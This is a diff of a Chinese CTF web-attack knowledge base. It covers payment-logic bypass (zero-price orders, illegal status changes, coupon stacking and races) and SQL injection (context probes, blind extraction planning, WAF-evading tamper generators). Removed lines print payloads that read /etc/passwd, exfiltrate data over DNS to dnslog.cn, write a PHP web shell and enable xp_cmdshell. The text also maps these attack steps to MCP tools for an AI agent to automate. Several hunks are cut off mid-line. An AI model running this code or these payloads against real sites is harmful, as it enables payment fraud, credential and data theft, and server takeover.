@@ -12703,6 +12703,59 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 > 目标：不付钱、付低价、付假钱、重复用权益、绕过购买流程直接拿货。每个绕过必须有 server-side 状态变更证据。
 
+## 0. 支付全链状态机与一致性 Oracle
+
+支付题的关键不是某个接口返回 `success`，而是六个账本是否一致：购物车、订单、支付网关、回调、发货、退款/对账。
+
+```text
+cart/quote → order → payment_intent → gateway_notify → fulfill → refund/reconcile
+   |           |          |                 |             |           |
+   price       total      gateway_amount     paid_amount   entitlement settlement
+```
+
+| 账本 | 关键字段 | 篡改入口 | 命中标志 | 失败样本 |
+|---|---|---|---|---|
+| cart/quote | `price`,`qty`,`discount`,`shipping` | 改金额/数量/优惠 | quote 接受异常金额 | order 重新按服务端价格计算 |
+| order | `order_id`,`total`,`currency`,`status` | mass assignment / 状态回退 | 订单持久化低价或 `paid` | 只影响前端展示 |
+| payment_intent | `amount`,`currency`,`channel` | 低价 intent / sandbox channel | 网关创建低价交易 | 网关金额恢复原价 |
+| gateway_notify | `trade_no`,`out_trade_no`,`total_amount`,`sign` | 回调伪造/重放/规范化 | notify 后 order 变 paid | 回调验签或金额核对失败 |
+| fulfill | `license`,`download`,`points`,`vip` | 跳步骤/重复发货 | 权益到账、flag 出现 | paid 但发货任务未触发 |
+| refund/reconcile | `refund_amount`,`settlement_status` | 部分退款/双退/结算差 | 退款后权益仍有效或余额增加 | 退款撤销权益 |
+
+```python
+# payment_consistency_oracle.py — 支付链一致性检查
+import requests
+
+class PaymentOracle:
+    def __init__(self, base, session=None):
+        self.base = base.rstrip("/")
+        self.s = session or requests.Session()
+
+    def snapshot(self, order_id):
+        endpoints = {
+            "order": f"/api/orders/{order_id}",
+            "payment": f"/api/payment/{order_id}",
+            "fulfill": f"/api/orders/{order_id}/entitlements",
+            "refund": f"/api/refunds?order_id={order_id}",
+        }
+        snap = {}
+        for name, path in endpoints.items():
+            r = self.s.get(self.base + path, timeout=10)
+            try:
+                body = r.json()
+            except Exception:
+                body = r.text[:500]
+            snap[name] = {"status": r.status_code, "body": body}
+        return snap
+
+    def is_paid_and_delivered(self, snap):
+        text = str(snap).lower()
+        return (
+            ("paid" in text or "trade_success" in text)
+            and any(x in text for x in ["license", "download", "entitlement", "vip", "flag{", "ctf{"])
+        )
+```
+
 ## 1. 参数篡改深度矩阵
 
 ### 1.1 金额字段全语言类型戏法
@@ -12978,73 +13031,7 @@ PYTHON_PAYLOADS = {
 ```python
 # 完整枚举所有可能的状态转换
 ORDERS = {
-    "pending":    ["paid", "cancelled", "expired", "refunding", "delivered"],
-    "paid":       ["delivered", "refunding", "refunded", "cancelled"],
-    "delivered":  ["refunding", "completed", "disputed"],
-    "cancelled":  ["reopened"],
-    "refunded":   ["closed"],
-    "expired":    ["reopened"],
-    "completed":  ["closed"],
-}
-
-# 对每个状态，尝试所有非法转换
-def state_machine_fuzz(order_id: str, current_state: str):
-    """尝试所有非法状态转换"""
-    all_states = list(ORDERS.keys())
-    legal = ORDERS.get(current_state, [])
-    illegal = [s for s in all_states if s not in legal]
-
-    endpoints = [
-        "/api/order/{id}/status",
-        "/api/order/update",
-        "/api/admin/order/update",
-        "/api/payment/status",
-        "/order/{id}/edit",
-        "/manage/order/change-status",
-    ]
-
-    for target_state in illegal:
-        payloads = [
-            {"status": target_state},
-            {"state": target_state},
-            {"order_status": target_state},
-            {"payment_status": target_state},
-            {"trade_status": target_state.upper()},
-            {"status": target_state, "force": True},
-            {"status": target_state, "admin": True},
-        ]
-        for ep in endpoints:
-            for payload in payloads:
-                url = BASE + ep.format(id=order_id)
-                r = S.post(url, json=payload, timeout=10, allow_redirects=False)
-                if r.status_code == 200:
-                    print(f"[!] ILLEGAL TRANSITION: {current_state} → {target_state}")
-                    print(f"    {url} → {r.status_code} | {r.text[:200]}")
-```
-
-### 3.2 状态回退绕过
-
-```python
-# 典型漏洞: 状态只向前检查，不检查回退
-# paid → delivered → paid (回退后重复发货)
-
-def state_rollback_test(order_id: str):
-    """测试状态回退"""
-    # Step 1: 获取当前状态
-    r = S.get(BASE + f"/api/orders/{order_id}")
-    initial = r.json().get("status")
-
-    # Step 2: 尝试回退到 pending
-    rollback_payloads = [
-        {"status": "pending"},
-        {"status": "unpaid"},
-        {"payment_status": "pending"},
-        {"paid": False},
-        {"is_paid": 0},
-        {"trade_status": "WAIT_BUYER_PAY"},
-    ]
-    for p in rollback_payloads:
-        r = S.post(BASE + f"/api/order/{order_id}/update", js
+    "pending":    ["paid", "cancelled", "expired", "refunding", "deliv
 
 [... content truncated for size ...]
 
@@ -13955,12 +13942,13 @@ AI Agent 可调用以下 MCP 工具自动检测上述漏洞：
 - [CWE-639] Authorization Bypass Through User-Controlled Key
 - [CWE-200] Exposure of Sensitive Information to an Unauthorized Actor
 
-## 证据与验证闭环
+## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+- `order_probe_matrix.csv`: order_id、email/token、登录态、状态码、响应长度、关键字段。
+- `bounce_payloads.json`: 退信/邮件链接里的订单号、签名、一次性 token、过期时间。
+- `role_compare.json`: 匿名、订单所有者、其他用户、管理员的响应字段 diff。
+- 成功样本: 非订单所有者读到订单、支付状态、下载链接、优惠券或 flag。
+- 失败样本: 只返回公共状态、链接过期、token 绑定邮箱或订单所有者。
 
 
 ---
@@ -15578,12 +15566,13 @@ curl -sI https://target | grep -iE 'server|x-powered-by|set-cookie'
 # 4. 对照上表锁定平台 → 运行对应的 toolkit 脚本
 ```
 
-## 证据与验证闭环
+## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+- `platform_fingerprint.json`: favicon hash、静态资源路径、接口路径、响应头、cookie 名称、JS 变量。
+- `endpoint_hits.csv`: 指纹路径、方法、状态码、body hash、平台候选、置信度。
+- `version_clues.md`: 版本号、插件名、默认后台、安装残留、已知路由。
+- 成功样本: 多个独立指纹同时命中并指向同一平台/版本，后续技术文件能复用。
+- 失败样本: 只有通用路径命中、CDN 缓存旧资源、二开项目删除了关键接口。
 
 ## MCP 工具映射
 
@@ -19175,6 +19164,50 @@ cart → quote → order → payment_intent → callback → fulfill/refund
 
 最终 oracle：订单状态变为 `paid/shipped/active`、权益/卡密/下载链接出现、余额/积分变化、库存扣减或退款到账。中间步骤 `200` 只能算候选。
 
+### 0.1 支付结果一致性矩阵
+
+金额参数每改一次，都要记录“五个值”：请求值、订单持久化值、网关值、回调值、最终权益值。
+
+| 请求值 | 订单值 | 网关值 | 回调值 | 权益/退款 | 判断 |
+|---|---|---|---|---|---|
+| `0` | `0` | `0` | `0` | 发货 | 零元购完整命中 |
+| `0.01` | 原价 | 原价 | 原价 | 发货 | 前端/quote 层失败 |
+| `0.01` | `0.01` | 原价 | 原价 | 不发货 | 订单层命中，网关层失败 |
+| `0.01` | `0.01` | `0.01` | `0.01` | 发货 | 低价支付完整命中 |
+| `-100` | `-100` | 不创建 | 余额增加 | 退款/充值 | 负值链命中 |
+| 原价 | 原价 | 原价 | `0.01` | 发货 | 回调金额未核对 |
+
+```python
+# payment_value_tracker.py — 金额链路五值记录
+def extract_amounts(order_resp=None, payment_resp=None, notify_resp=None, fulfill_resp=None):
+    def pick(obj, keys):
+        if obj is None:
+            return None
+        if hasattr(obj, "json"):
+            try:
+                obj = obj.json()
+            except Exception:
+                obj = {}
+        for key in keys:
+            cur = obj
+            for part in key.split("."):
+                if isinstance(cur, dict) and part in cur:
+                    cur = cur[part]
+                else:
+                    cur = None
+                    break
+            if cur is not None:
+                return cur
+        return None
+
+    return {
+        "order_amount": pick(order_resp, ["amount", "total", "data.amount", "data.total"]),
+        "gateway_amount": pick(payment_resp, ["amount", "total_amount", "data.amount"]),
+        "notify_amount": pick(notify_resp, ["amount", "paid_amount", "total_amount"]),
+        "entitlement": pick(fulfill_resp, ["license", "download", "vip", "flag", "data.license"]),
+    }
+```
+
 ### 1. 价格操纵深度矩阵
 
 #### 1.1 类型混淆全向量
@@ -19414,57 +19447,7 @@ class CouponLifecycleAttack:
             # 两次固定金额
             {"coupons": ["FIX50", "FIX50"]},
             # 平台券 + 店铺券
-            {"coupons": ["PLATFORM50", "STORE50"]},
-            # 满减: 不满足条件时使用
-            {"coupons": ["OVER100_MINUS50"], "amount": 30},
-            # 优惠金额 > 商品金额
-            {"coupons": ["BIG100"], "amount": 50},
-        ]
-        results = []
-        for payload in stacking_payloads:
-            r = self.s.post(f"{self.base}/api/order/apply-coupons",
-                           json=payload, timeout=10)
-            results.append({
-                "payload": payload,
-                "status": r.status_code,
-                "body": r.text[:200],
-            })
-        return results
-
-    def _use_on_wrong_product(self):
-        """全场券用限定商品之外"""
-        r = self.s.post(f"{self.base}/api/order/apply-coupon", json={
-            "coupon_code": "SPECIFIC_PRODUCT_COUPON",
-            "product_id": 999,  # 不在限定范围
-        })
-        return {"status": r.status_code, "body": r.text[:200]}
-```
-
-#### 2.2 优惠券竞态条件 (Race Condition)
-
-```python
-# coupon_race_advanced.py — 高级优惠券竞态
-
-import concurrent.futures, threading, time, requests
-
-class CouponRaceAttack:
-    """优惠券竞态攻击 - 单券多领、双券同用"""
-
-    def __init__(self, base_url, token):
-        self.base = base_url
-        self.headers = {"Authorization": f"Bearer {token}"}
-
-    def single_coupon_multi_use(self, coupon_code: str, n_requests: int = 50,
-                                 concurrency: int = 20):
-        """
-        单张优惠券多用户同时领取
-        真实案例: GrandNode CVE-2025-10216
-        """
-        successes = []
-        errors = []
-        lock = threading.Lock()
-
-
+            {"coupons"
 
 [... content truncated for size ...]
 
@@ -30413,6 +30396,65 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 如果只有“错误页变了”但数据不变，先记录 SQL parser 已经接触到 payload；下一步换布尔/时间表达式确认语义执行。
 
+### 1.4.1 上下文自动分类器
+
+CTF 里最浪费时间的是把 payload 打错上下文。先用一组低成本 probe 给参数打标签，再进入对应分支。
+
+```python
+# sqli_context_classifier.py — SQL 注入上下文分类
+import hashlib
+import requests
+
+PROBES = {
+    "quote_error": "'",
+    "int_bool_true": "1 AND 1=1",
+    "int_bool_false": "1 AND 1=2",
+    "str_bool_true": "' AND '1'='1",
+    "str_bool_false": "' AND '1'='2",
+    "like_break": "%' AND '1'='1",
+    "order_case": "CASE WHEN(1=1) THEN 1 ELSE 2 END",
+    "limit_expr": "1 OFFSET 0",
+    "json_path_break": "x') OR 1=1-- ",
+}
+
+def sig(resp):
+    text = resp.text[:4096]
+    return {
+        "status": resp.status_code,
+        "len": len(resp.text),
+        "hash": hashlib.sha256(text.encode(errors="ignore")).hexdigest()[:12],
+        "location": resp.headers.get("Location", ""),
+    }
+
+def classify_param(url, param="id", baseline="1"):
+    s = requests.Session()
+    base = sig(s.get(url, params={param: baseline}, timeout=8))
+    out = {"baseline": base, "probes": {}}
+    for name, payload in PROBES.items():
+        r = s.get(url, params={param: payload}, timeout=8, allow_redirects=False)
+        out["probes"][name] = sig(r)
+
+    def changed(a):
+        return a["status"] != base["status"] or abs(a["len"] - base["len"]) > 80 or a["hash"] != base["hash"]
+
+    hints = []
+    if changed(out["probes"]["quote_error"]):
+        hints.append("quoted_or_parser_error")
+    if changed(out["probes"]["int_bool_false"]) and not changed(out["probes"]["int_bool_true"]):
+        hints.append("integer_where")
+    if changed(out["probes"]["str_bool_false"]) and not changed(out["probes"]["str_bool_true"]):
+        hints.append("string_where")
+    if changed(out["probes"]["like_break"]):
+        hints.append("like_context")
+    if changed(out["probes"]["order_case"]):
+        hints.append("order_by_context")
+    if changed(out["probes"]["json_path_break"]):
+        hints.append("json_path_context")
+
+    out["hints"] = hints or ["unknown_use_time_or_error_probe"]
+    return out
+```
+
 ### 1.5 DBMS 指纹速查矩阵
 
 | DBMS | 版本函数 | 当前库/用户 | 时间函数 | Catalog |
@@ -30583,139 +30625,48 @@ extract_ascii(
 
 失败样本：True/False 长度随机跳动，说明页面有动态内容；改用固定字段、状态码、跳转位置、特定 DOM 片段或响应哈希去判定。
 
-## 5. 时间盲注 (Time-based)
+### 4.4 结果集枚举策略
 
-### 5.1 MySQL
+抽数据时先抽“小而稳定”的元信息，再抽大字段；先定位表名、列名、行数、长度，再逐行分段。不要一上来抽 `GROUP_CONCAT(password)`，很容易被长度、编码和超时截断。
 
-```sql
--- SLEEP
-?id=1 AND SLEEP(3)--
-?id=1 AND IF(SUBSTR(database(),1,1)='t',SLEEP(3),0)--
-
--- BENCHMARK
-?id=1 AND IF(1=1,BENCHMARK(5000000,MD5(1)),0)--
-
--- 笛卡尔积延时
-?id=1 AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.columns C)=1--
-```
-
-### 5.2 PostgreSQL
-
-```sql
-?id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
-```
-
-### 5.3 MSSQL
-
-```sql
-?id=1; IF (1=1) WAITFOR DELAY '0:0:3'--
-```
-
-### 5.4 时间盲注抗抖动
-
-时间盲注先采样 baseline，不要只凭一次 3 秒延迟判断。实战里把延迟设成 baseline p95 的 2-3 倍，再做重复投票。
+| 目标 | SQL 表达式 | 判断 |
+|---|---|---|
+| 当前库 | `database()` / `current_database()` | 确认 DBMS 与权限 |
+| 表数量 | `COUNT(*) FROM information_schema.tables ...` | 判断枚举规模 |
+| 第 N 张表名长度 | `LENGTH((SELECT table_name ... LIMIT N,1))` | 先定长度 |
+| 第 N 张表名字符 | `SUBSTR((SELECT table_name ...),pos,1)` | 二分提取 |
+| 列名 | `information_schema.columns` | 优先找 `user/pass/token/flag` |
+| 行数 | `COUNT(*) FROM target_table` | 判断是否需要分页 |
+| 敏感字段长度 | `LENGTH(password)` | 避免超长盲抽 |
 
 ```python
-import statistics
-import time
-import requests
+# blind_plan.py — 生成盲注抽取任务
+INTERESTING_COLUMNS = ["flag", "password", "passwd", "pwd", "token", "secret", "key", "email", "role"]
 
-def timed(url, payload):
-    t0 = time.perf_counter()
-    requests.get(url, params={"id": payload}, timeout=12)
-    return time.perf_counter() - t0
+def table_name_expr(offset, dbms="mysql"):
+    if dbms == "mysql":
+        return (
+            "SELECT table_name FROM information_schema.tables "
+            "WHERE table_schema=database() "
+            f"ORDER BY table_name LIMIT {offset},1"
+        )
+    if dbms == "postgres":
+        return (
+            "SELECT tablename FROM pg_catalog.pg_tables "
+            "WHERE schemaname NOT IN ('pg_catalog','information_schema') "
+            f"ORDER BY tablename LIMIT 1 OFFSET {offset}"
+        )
+    if dbms == "sqlite":
+        return f"SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 1 OFFSET {offset}"
+    raise ValueError(dbms)
 
-def calibrate(url):
-    samples = [timed(url, "1") for _ in range(8)]
-    return statistics.mean(samples), max(samples)
+def column_name_expr(table, offset, dbms="mysql"):
+    if dbms in {"mysql", "postgres"}:
+        return (
+            "SELECT column_name FROM information_schema.columns "
+            f"WHERE table_name='{table}' ORDE
 
-def time_true(url, template, expr, delay=4, votes=3):
-    payload = template.replace("§", f"IF({expr},SLEEP({delay}),0)")
-    hits = 0
-    for _ in range(votes):
-        if timed(url, payload) > delay * 0.75:
-            hits += 1
-    return hits >= 2
-```
-
-命中样本：True 分支稳定超过阈值，False 分支接近 baseline；失败样本：两边都慢，可能是锁等待、WAF 排队、笛卡尔积误伤或网络抖动。
-
-## 6. 文件读写
-
-### 6.1 MySQL
-
-```sql
--- 读取文件 (需 FILE 权限)
-?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--
-
--- DNS OOB 带外注入
-?id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.dnslog.cn\\a')))--
-
--- 写入文件 (需 FILE 权限 + secure_file_priv)
-?id=-1 UNION SELECT 1,'<?php system($_GET[1]);?>',3,4,5 INTO OUTFILE '/var/www/html/shell.php'--
-```
-
-### 6.2 MSSQL
-
-```sql
--- xp_cmdshell (需 sysadmin)
-EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
-EXEC xp_cmdshell 'whoami';
-```
-
-## 7. WAF 绕过
-
-| 技术 | 示例 |
-|------|------|
-| 大小写 | `SeLeCt` |
-| 双写 | `SELSELECTECT` |
-| 注释 | `SEL/**/ECT` |
-| URL编码 | `%53%45%4C%45%43%54` |
-| 内联注释 | `/*!50000SELECT*/` |
-| 换行符 | `SEL%0aECT` |
-| 制表符 | `SEL%09ECT` |
-| 等价函数 | `&&`→`AND`, `\|\|`→`OR` |
-| 宽字节 | `%bf%27` (GBK) |
-| HPP | `?id=1&id=2 UNION SELECT...` |
-| 编码绕过 | `CHAR(115,101,108,101,99,116)` |
-
-## 攻击链 / 工作流
-
-```
-1. 枚举所有输入点：URL 参数、POST 表单、Cookie、Header、JSON/XML 字段
-2. 用闭合符和布尔表达式确认是否存在 SQL 语义差异
-3. 通过报错信息、时间函数或特征语句识别 DBMS 指纹
-4. 有回显：走 ORDER BY → UNION 列数 → 回显位 → 表/列/数据提取
-5. 无回显：走 Boolean/Time blind，优先提取 database/user/version 等稳定指纹
-6. 有文件权限：评估 LOAD_FILE / INTO OUTFILE / xp_cmdshell 等扩展能力
-7. 遇到 WAF：记录拦截规则后转入高级绕过文档，避免无序 payload 爆破
-```
-
-## Evidence
-
-| 阶段 | 证据 |
-|------|------|
-| 注入确认 | 原始参数、payload、正常/异常响应差异 |
-| DBMS 指纹 | 报错栈、版本函数、时间函数响应 |
-| 数据提取 | UNION 回显位、盲注脚本输出、字段样例 |
-| 文件读写 | 目标路径、返回内容片段、写入文件哈希 |
-| WAF 记录 | 被拦截 payload、状态码、绕过前后对比 |
-
-## MCP 工具映射
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| 知识检索 | `kb_router` | 按 SQLi、blind、error-based、union 信号搜索 |
-| HTTP 对比 | `http_probe` | 比较 True/False/Time payload 的响应差异 |
-| 自动化验证 | `run_ctf_tool` | 调用 sqlmap 或自定义脚本做可控验证 |
-| 证据落盘 | `workspace_write_text` | 保存请求响应、payload 与结论 |
-
-## 8. 关联技术
-
-- [[sqli-nosqli]] — SQL/NoSQL 注入
-- [[02-sqli-advanced]] — 高级注入技术
-- [[06-card-platform]] — 发卡平台实战
-- [[04-config-exposure]] — 配置文件读取
+[... content truncated for size ...]
 
 
 ---
@@ -30847,6 +30798,71 @@ for p in mutate_sql_keyword("1 UNION SELECT 1,database(),3"):
 ```
 
 记录绕过矩阵时保留“被拦截 payload”和“通过 payload”的最小差异，例如只把空格换成 `/**/` 就通过，就不要再叠十种编码。
+
+### 1.7 Tamper 组合器
+
+WAF 绕过不是 payload 数量越多越好，而是找到“最小变形”。下面的组合器按层生成变体，并给每个变体打上来源标签，便于回填 evidence。
+
+```python
+# sqli_tamper_composer.py — 分层 tamper 生成器
+from itertools import product
+
+def t_case(s): return s.replace("UNION", "UnIoN").replace("SELECT", "SeLeCt").replace("AND", "AnD")
+def t_comment(s): return s.replace(" ", "/**/")
+def t_newline(s): return s.replace(" ", "%0a")
+def t_inline(s): return s.replace("SELECT", "/*!50000SELECT*/").replace("UNION", "/*!50000UNION*/")
+def t_operator(s): return s.replace(" AND ", " && ").replace(" OR ", " || ")
+def t_func(s): return s.replace("database()", "schema()").replace("substr(", "mid(")
+
+LAYERS = {
+    "token_case": [lambda s: s, t_case],
+    "space": [lambda s: s, t_comment, t_newline],
+    "mysql_inline": [lambda s: s, t_inline],
+    "operator": [lambda s: s, t_operator],
+    "function": [lambda s: s, t_func],
+}
+
+def compose_tampers(payload, max_layers=3):
+    names = list(LAYERS)
+    seen = {payload}
+    for chosen in product(*[LAYERS[n] for n in names]):
+        used = [names[i] for i, fn in enumerate(chosen) if fn(payload) != payload]
+        if len(used) > max_layers:
+            continue
+        out = payload
+        for fn in chosen:
+            out = fn(out)
+        if out not in seen:
+            seen.add(out)
+            yield {"payload": out, "layers": used}
+
+for item in compose_tampers("1 UNION SELECT 1,database(),3 AND 1=1-- "):
+    print(item["layers"], item["payload"])
+```
+
+绕过记录格式：
+
+```json
+{
+  "blocked": "1 UNION SELECT 1,database(),3-- ",
+  "accepted": "1/**/UnIoN/**/SeLeCt/**/1,schema(),3--/**/",
+  "changed_layers": ["token_case", "space", "function"],
+  "waf_signal": {"status": 403, "body_hash": "a13f..."},
+  "db_signal": {"status": 200, "marker": "current schema echoed"}
+}
+```
+
+### 1.8 DBMS 方言差异速查
+
+| 语义 | MySQL | PostgreSQL | MSSQL | SQLite | Oracle |
+|---|---|---|---|---|---|
+| 字符串截取 | `substr(s,p,1)` | `substr(s,p,1)` | `substring(s,p,1)` | `substr(s,p,1)` | `substr(s,p,1)` |
+| ASCII | `ascii(c)` | `ascii(c)` | `ascii(c)` | `unicode(c)` | `ascii(c)` |
+| 长度 | `length(s)` | `length(s)` | `len(s)` | `length(s)` | `length(s)` |
+| 拼接 | `concat(a,b)` | `a||b` | `a+b` | `a||b` | `a||b` |
+| 单行限制 | `LIMIT 1 OFFSET n` | `LIMIT 1 OFFSET n` | `OFFSET n ROWS FETCH NEXT 1 ROWS ONLY` | `LIMIT 1 OFFSET n` | `ROWNUM` / `FETCH FIRST` |
+| 时间 | `sleep(n)` | `pg_sleep(n)` | `WAITFOR DELAY` | heavy query | `DBMS_PIPE.RECEIVE_MESSAGE` |
+| 报错 | `updatexml/extractvalue` | `CAST(x AS INT)` | `CONVERT(INT,x)` | `json_extract`/类型错误 | `UTL_INADDR`/类型转换 |
 
 ## 2. 二阶 SQL 注入
 
@@ -31046,10 +31062,9 @@ UPDATE users SET password='new' WHERE username='admin' AND SLEEP(3)--
 
 ## 9. 关联技术
 
-- [[01-sqli-fundamentals]] — SQL 注入基础
-- [[03-nosql-injection]] — NoSQL 注入
-- [[06-card-platform]] — 发卡平台实战
-- [[sqli-nosqli]] — SQL/NoSQL 注入
+- [[01-sql
+
+[... content truncated for size ...]
 
 
 ---
